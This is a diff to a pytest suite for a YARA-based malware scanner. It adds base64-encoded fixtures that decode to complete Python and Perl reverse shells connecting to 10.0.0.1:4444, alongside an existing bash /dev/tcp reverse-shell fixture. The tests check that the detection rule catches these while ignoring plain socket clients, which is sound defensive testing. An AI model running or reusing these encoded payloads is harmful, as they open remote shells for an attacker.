@@ -90,6 +90,34 @@ def _reverse_shell_fixture() -> str:
     return base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx").decode()
 
 
+def _python_socket_shell_fixture() -> str:
+    """Complete Python reverse shell: socket client plus fd redirection and shell spawn.
+
+    Base64-encoded per this module's antivirus-safety convention.
+    """
+    return base64.b64decode(
+        "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9z"
+        "CnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0p"
+        "CnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLDAp"
+        "Cm9zLmR1cDIocy5maWxlbm8oKSwxKQpvcy5kdXAyKHMuZmlsZW5vKCksMikKcD1zdWJw"
+        "cm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK"
+    ).decode()
+
+
+def _perl_socket_shell_fixture() -> str:
+    """Complete Perl reverse shell: socket client plus stdio redirection and shell exec.
+
+    Base64-encoded per this module's antivirus-safety convention.
+    """
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsKJGk9IjEwLjAuMC4xIjskcD00NDQ0Owpzb2NrZXQoU09DS0VULFBG"
+        "X0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTsKY29ubmVjdChT"
+        "T0NLRVQsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpOwpvcGVuKFNURElOLCI+"
+        "JlNPQ0tFVCIpOwpvcGVuKFNURE9VVCwiPiZTT0NLRVQiKTsKb3BlbihTVERFUlIsIj4m"
+        "U09DS0VUIik7CmV4ZWMoIi9iaW4vc2ggLWkiKTsK"
+    ).decode()
+
+
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
     return any(rule_name in f.message for f in findings)
@@ -595,18 +623,30 @@ class TestBuiltInMalwarePackaging:
     @pytest.mark.parametrize(
         "content, filename",
         [
-            (
-                "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
-                's.connect(("10.0.0.1", 4444))\n',
-                "shell.py",
-            ),
-            ("use Socket;\nsocket(SOCKET, PF_INET, SOCK_STREAM, 6);\n", "shell.pl"),
+            (_python_socket_shell_fixture(), "shell.py"),
+            (_perl_socket_shell_fixture(), "shell.pl"),
         ],
     )
-    def test_builtin_reverse_shell_matches_multiline_socket_forms(
+    def test_builtin_reverse_shell_matches_complete_socket_shells(
         self, content: str, filename: str
     ) -> None:
         assert _has_rule(_run_builtin(content, filename), "reverse_shell")
+
+    @pytest.mark.parametrize(
+        "content, filename",
+        [
+            (
+                "import socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+                's.connect(("10.0.0.1", 4444))\n',
+                "client.py",
+            ),
+            ("use Socket;\nsocket(SOCKET, PF_INET, SOCK_STREAM, 6);\n", "client.pl"),
+        ],
+    )
+    def test_builtin_reverse_shell_ignores_plain_socket_clients(
+        self, content: str, filename: str
+    ) -> None:
+        assert not _has_rule(_run_builtin(content, filename), "reverse_shell")
 
     def test_extra_rules_still_match_with_builtin_malware_representation(self, tmp_path):
         _write_rule(
